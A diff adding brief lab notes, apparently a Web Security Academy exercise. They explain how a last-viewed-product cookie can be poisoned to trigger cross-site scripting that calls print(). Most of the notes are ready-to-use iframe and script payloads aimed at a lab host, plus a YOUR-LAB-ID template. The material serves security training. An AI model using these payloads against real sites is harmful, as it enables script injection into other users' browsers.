@@ -1,0 +1,19 @@
+goal:
+    inject a cookie that will cause XSS on a different page and call the print() function
+
+ANALYST:
+    auto add last viewed product url into cookie
+    try add payload to url in last page => save all in cookie
+
+    => try this to attack user
+
+
+payload:
+
+<iframe src="https://0a99005404d328e6c6d0c3c7007b003e.web-security-academy.net/product?productId=1&<script>print()</script>" onload="if(!window.x)this.src='https://0a99005404d328e6c6d0c3c7007b003e.web-security-academy.net';window.x=1;"></iframe>
+
+
+if(!window.x)this.src='https://0a99005404d328e6c6d0c3c7007b003e.web-security-academy.net/product';window.x=1;
+
+
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;"></iframe>
